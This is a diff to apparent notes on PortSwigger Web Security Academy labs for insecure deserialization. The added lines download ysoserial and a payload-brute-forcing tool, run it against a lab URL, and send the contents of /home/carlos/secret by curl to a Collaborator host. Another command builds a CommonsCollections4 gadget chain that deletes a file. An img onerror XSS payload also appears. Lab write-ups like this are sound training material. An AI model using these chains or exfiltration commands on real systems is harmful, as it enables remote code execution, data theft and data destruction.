@@ -64,7 +64,19 @@ src="https://lab_id.web-security-academy.net/feedback?name=<img src=1 onerror=pr
   Send this for the magic method to be automatically invoked and delete Carlos's file.
 - ==Exploiting Java deserialization with Apache Commons==
   Download ysoserial-all.jar 
-  
+  `curl -LO https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar`
+  Download LookingSerial
+```
+git clone https://github.com/nirzaaa/LookingSerial.git
+cd LookingSerial
+curl -LO https://raw.githubusercontent.com/nirzaaa/LookingSerial/refs/heads/main/payloads.txt
+python3 looking_serial.py -u "https://lab_id.web-security-academy.net/my-account" -p "payloads.txt" -c "curl collaborator_payload"
+
+
+python3 looking_serial.py -u "https://lab_id.web-security-academy.net/my-account" -p "payloads.txt" -c "curl https://COLLAB_oastify\$(cat /home/carlos/secret)"
+
+```
+
   java   --add-exports=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED   --add-exports=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED   -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0
    
   Encode in URL and modify cookie in repeater and send
